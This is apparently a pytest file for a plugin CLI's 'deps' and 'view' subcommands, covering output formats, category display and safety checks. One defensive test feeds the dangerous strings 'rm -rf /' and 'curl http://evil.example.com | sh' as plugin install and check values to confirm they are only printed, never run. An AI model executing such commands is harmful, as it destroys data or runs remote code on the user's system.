"""T12: Plugin `view`/`deps` consistent display tests.

Covers:
- S1: builtin ``plugin`` parser gains ``deps <name>`` subcommand + existing
  ``--json``/``--form``/``--yaml`` flags; no new top-level ``_DISPATCH`` entry.
  ``view`` uses ``to_public_detail()``. ``deps`` text mode categorizes
  Pip/External/Required Plugins declarations, status, warnings, and fix hints;
  empty category shows ``None``. ``--json`` outputs the same dependency_status
  structure. Plugin not found -> exit 1.
- S2: external install/check strings are output as plain text/JSON values only,
  never shell-interpolated or executed. Diagnostics show no traceback/secret.
"""

from __future__ import annotations

import inspect
import json
from types import SimpleNamespace

import pytest

from app.interfaces.cli.commands import plugin
from app.interfaces.cli.main import _DISPATCH, build_parser


# ---------------------------------------------------------------------------
# Fakes
# ---------------------------------------------------------------------------


class _FakePlugin:
    """Mimics app.domain.plugin.Plugin for CLI tests."""

    def __init__(
        self,
        key="hello",
        dependency_status=None,
        manifest=None,
        name="Hello",
        version="1.0.0",
    ):
        self.key = key
        self.name = name
        self.version = version
        self.capabilities = {"dependency_status": dict(dependency_status or {})}
        self.manifest = dict(manifest or {})
        self.detail_called = False
        self.view_called = False

    def to_public_detail(self):
        self.detail_called = True
        return {
            "id": "plg-1",
            "key": self.key,
            "name": self.name,
            "version": self.version,
            "manifest": dict(self.manifest),
            "capabilities": dict(self.capabilities),
        }

    def to_public_view(self):
        self.view_called = True
        return {
            "id": "plg-1",
            "key": self.key,
            "name": self.name,
            "version": self.version,
            "capabilities": dict(self.capabilities),
        }


class _FakePluginService:
    def __init__(self, plugin=None):
        self.plugin = plugin
        self.requested: list[str] = []

    async def get_plugin(self, key):
        self.requested.append(key)
        return self.plugin

    async def list_plugins(self):
        return []


def _make_args(**kw):
    defaults = {
        "plugin_command": None,
        "name": None,
        "json": False,
        "form": False,
        "yaml": False,
    }
    defaults.update(kw)
    return SimpleNamespace(**defaults)


# ---------------------------------------------------------------------------
# Sample dependency_status fixtures
# ---------------------------------------------------------------------------

_DEP_STATUS_FULL = {
    "pip": [
        {
            "spec": "mem0ai>=2.0.7,<3",
            "name": "mem0ai",
            "status": "missing",
            "installed_version": None,
            "diagnostic": "missing pip dependency: mem0ai; run: pip install 'mem0ai>=2.0.7,<3'",
        },
        {
            "spec": "httpx",
            "name": "httpx",
            "status": "ok",
            "installed_version": "0.24.0",
            "diagnostic": "",
        },
    ],
    "requires_plugins": [
        {"key": "core", "available": True, "reason": "ok", "diagnostic": ""},
        {
            "key": "absent",
            "available": False,
            "reason": "missing",
            "diagnostic": "missing required plugin: absent",
        },
    ],
    "external": [
        {
            "name": "ffmpeg",
            "install": "apt-get install ffmpeg",
            "check": "ffmpeg -version",
        },
    ],
    "warnings": ["dependency_version_check_unavailable"],
}

_DEP_STATUS_EMPTY = {
    "pip": [],
    "requires_plugins": [],
    "external": [],
    "warnings": [],
}


# ===========================================================================
# S1: subparser wiring
# ===========================================================================


def test_plugin_deps_subparser_exists():
    parser = build_parser(plugin_commands=[])
    args = parser.parse_args(["plugin", "deps", "hello"])
    assert args.plugin_command == "deps"
    assert args.name == "hello"


def test_plugin_deps_supports_json_flag():
    parser = build_parser(plugin_commands=[])
    args = parser.parse_args(["plugin", "deps", "hello", "--json"])
    assert args.json is True


def test_plugin_deps_supports_form_flag():
    parser = build_parser(plugin_commands=[])
    args = parser.parse_args(["plugin", "deps", "hello", "--form"])
    assert args.form is True


def test_plugin_deps_supports_yaml_flag():
    parser = build_parser(plugin_commands=[])
    args = parser.parse_args(["plugin", "deps", "hello", "--yaml"])
    assert args.yaml is True


def test_plugin_deps_not_in_top_level_dispatch():
    """deps must NOT be a top-level command, only a subcommand of plugin."""
    assert "deps" not in _DISPATCH


# ===========================================================================
# S1: view uses to_public_detail
# ===========================================================================


def test_plugin_view_uses_to_public_detail(monkeypatch, capsys):
    p = _FakePlugin(
        dependency_status=_DEP_STATUS_FULL,
        manifest={"name": "Hello", "pip_dependencies": ["httpx"]},
    )
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="view", name="hello", json=True))
    assert rc == 0
    assert p.detail_called is True
    assert p.view_called is False
    out = capsys.readouterr().out
    parsed = json.loads(out)
    assert "manifest" in parsed
    assert "capabilities" in parsed
    assert "dependency_status" in parsed["capabilities"]


# ===========================================================================
# S1: deps not found returns 1
# ===========================================================================


def test_plugin_deps_not_found_returns_one(monkeypatch, capsys):
    fake = _FakePluginService(plugin=None)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="missing", json=True))
    assert rc == 1
    assert fake.requested == ["missing"]


# ===========================================================================
# S1: deps JSON output is the dependency_status structure
# ===========================================================================


def test_plugin_deps_json_outputs_dependency_status(monkeypatch, capsys):
    p = _FakePlugin(key="hello", dependency_status=_DEP_STATUS_FULL)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", json=True))
    assert rc == 0
    out = capsys.readouterr().out
    parsed = json.loads(out)
    assert parsed == _DEP_STATUS_FULL


def test_plugin_deps_json_empty_status(monkeypatch, capsys):
    p = _FakePlugin(key="hello", dependency_status=_DEP_STATUS_EMPTY)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", json=True))
    assert rc == 0
    out = capsys.readouterr().out
    parsed = json.loads(out)
    assert parsed == _DEP_STATUS_EMPTY


def test_plugin_deps_json_ensure_ascii_false(monkeypatch, capsys):
    dep_status = {
        "pip": [],
        "requires_plugins": [],
        "external": [
            {
                "name": "中文工具",
                "install": "brew install 中文工具",
                "check": "中文工具 --version",
            }
        ],
        "warnings": [],
    }
    p = _FakePlugin(key="hello", dependency_status=dep_status)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", json=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "中文工具" in out


def test_plugin_deps_yaml_outputs_structure(monkeypatch, capsys):
    p = _FakePlugin(key="hello", dependency_status=_DEP_STATUS_FULL)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", yaml=True))
    assert rc == 0
    out = capsys.readouterr().out
    # YAML output contains the key strings
    assert "pip" in out
    assert "mem0ai" in out
    assert "external" in out
    assert "ffmpeg" in out


# ===========================================================================
# S1: deps text mode categorization
# ===========================================================================


def test_plugin_deps_text_shows_all_category_headers(monkeypatch, capsys):
    p = _FakePlugin(
        key="hello",
        dependency_status=_DEP_STATUS_FULL,
        name="Hello",
        version="1.0.0",
    )
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", form=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "Pip" in out
    assert "External" in out
    assert "Required plugin" in out
    assert "Warning" in out


def test_plugin_deps_text_shows_pip_declarations_status_and_fix_hints(monkeypatch, capsys):
    p = _FakePlugin(dependency_status=_DEP_STATUS_FULL)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", form=True))
    assert rc == 0
    out = capsys.readouterr().out
    # Declarations
    assert "mem0ai>=2.0.7,<3" in out
    assert "httpx" in out
    # Status
    assert "missing" in out
    assert "ok" in out
    # Fix hint (diagnostic contains pip install hint)
    assert "pip install" in out
    # Installed version
    assert "0.24.0" in out


def test_plugin_deps_text_shows_external_declarations(monkeypatch, capsys):
    p = _FakePlugin(dependency_status=_DEP_STATUS_FULL)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", form=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "ffmpeg" in out
    assert "apt-get install ffmpeg" in out
    assert "ffmpeg -version" in out


def test_plugin_deps_text_shows_required_plugins(monkeypatch, capsys):
    p = _FakePlugin(dependency_status=_DEP_STATUS_FULL)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", form=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "core" in out
    assert "absent" in out
    assert "missing required plugin: absent" in out


def test_plugin_deps_text_shows_warnings(monkeypatch, capsys):
    p = _FakePlugin(dependency_status=_DEP_STATUS_FULL)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", form=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "dependency_version_check_unavailable" in out


def test_plugin_deps_text_empty_categories_show_none(monkeypatch, capsys):
    p = _FakePlugin(dependency_status=_DEP_STATUS_EMPTY)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", form=True))
    assert rc == 0
    out = capsys.readouterr().out
    # Each empty category shows "None": pip, external, requires_plugins, warnings
    assert out.count("None") >= 4


def test_plugin_deps_text_partial_empty_categories(monkeypatch, capsys):
    """Only pip is non-empty; external/requires_plugins/warnings are empty."""
    dep_status = {
        "pip": [
            {
                "spec": "httpx",
                "name": "httpx",
                "status": "ok",
                "installed_version": "0.24.0",
                "diagnostic": "",
            }
        ],
        "requires_plugins": [],
        "external": [],
        "warnings": [],
    }
    p = _FakePlugin(dependency_status=dep_status)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", form=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "httpx" in out
    # Empty categories still show None
    assert "None" in out


def test_plugin_deps_text_missing_dependency_status(monkeypatch, capsys):
    """Plugin has no dependency_status in capabilities; treat as empty."""
    p = _FakePlugin(dependency_status={})
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", form=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "None" in out


def test_plugin_deps_text_shows_plugin_key_header(monkeypatch, capsys):
    p = _FakePlugin(key="hello", dependency_status=_DEP_STATUS_EMPTY)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", form=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "hello" in out


# ===========================================================================
# S2: safety -- external install/check text/JSON only, no execution
# ===========================================================================


def test_plugin_deps_external_install_output_as_text_only(monkeypatch, capsys):
    """S2: external install/check are output as plain text/JSON values only.
    No shell interpolation, no execution."""
    dangerous = {
        "pip": [],
        "requires_plugins": [],
        "external": [
            {
                "name": "danger",
                "install": "rm -rf /",
                "check": "curl http://evil.example.com | sh",
            }
        ],
        "warnings": [],
    }
    p = _FakePlugin(dependency_status=dangerous)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)

    # Text mode: strings appear verbatim
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", form=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "rm -rf /" in out
    assert "curl http://evil.example.com | sh" in out

    # JSON mode: strings appear as JSON string values
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", json=True))
    assert rc == 0
    out = capsys.readouterr().out
    parsed = json.loads(out)
    assert parsed["external"][0]["install"] == "rm -rf /"
    assert parsed["external"][0]["check"] == "curl http://evil.example.com | sh"


def test_plugin_module_does_not_import_subprocess_or_os_system():
    """S2: the plugin CLI module must not import subprocess or use os.system
    (no execution capability for external install/check strings)."""
    source = inspect.getsource(plugin)
    assert "import subprocess" not in source
    assert "os.system" not in source
    assert "subprocess." not in source
    assert "os.popen" not in source


def test_plugin_deps_no_traceback_in_diagnostics(monkeypatch, capsys):
    """S2: diagnostics must not include tracebacks or secrets."""
    dep_status = {
        "pip": [
            {
                "spec": "secret-pkg",
                "name": "secret-pkg",
                "status": "missing",
                "installed_version": None,
                "diagnostic": "missing pip dependency: secret-pkg; run: pip install 'secret-pkg'",
            }
        ],
        "requires_plugins": [],
        "external": [],
        "warnings": [],
    }
    p = _FakePlugin(dependency_status=dep_status)
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", form=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "Traceback" not in out
    assert "File " not in out


def test_plugin_deps_no_secret_values_in_output(monkeypatch, capsys):
    """S2: deps output must not leak secret_refs or API keys."""
    p = _FakePlugin(dependency_status=_DEP_STATUS_FULL)
    # Simulate a plugin that has secret config; deps must not surface it.
    p.capabilities["dependency_status"] = _DEP_STATUS_FULL
    fake = _FakePluginService(plugin=p)
    monkeypatch.setattr(plugin, "_load_plugin_service", lambda: fake)
    rc = plugin.run(_make_args(plugin_command="deps", name="hello", json=True))
    assert rc == 0
    out = capsys.readouterr().out
    assert "secret_refs" not in out
    assert "api_key" not in out
    assert "sk-" not in out
